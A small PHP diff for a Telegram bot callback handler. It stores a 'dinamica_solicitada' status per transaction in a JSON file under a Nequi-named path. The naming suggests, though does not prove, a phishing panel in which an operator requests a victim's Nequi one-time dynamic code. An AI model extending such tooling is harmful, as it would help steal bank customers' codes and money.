@@ -15,15 +15,15 @@ if ($update && isset($update['callback_query'])) {
         // Extraer transactionId del callback data
         $transactionId = str_replace('solicitar_dinamica_', '', $callbackData);
 
-        // Actualizar el archivo de estado
-        $statusFile = 'dinamica_status.json';
-        $statusData = [
-            'transactionId' => $transactionId,
+        // Actualizar el archivo de estado en la ubicación correcta para nequi-1
+        $statusFile = __DIR__ . '/data-ps/recargas/transaction/nequi-1/dinamica_status.json';
+        $data = file_exists($statusFile) ? json_decode(file_get_contents($statusFile), true) : [];
+        $data[$transactionId] = [
             'status' => 'dinamica_solicitada',
+            'message_id' => null,
             'timestamp' => time()
         ];
-
-        file_put_contents($statusFile, json_encode($statusData));
+        file_put_contents($statusFile, json_encode($data));
 
         // Responder al callback de Telegram
         $response = [
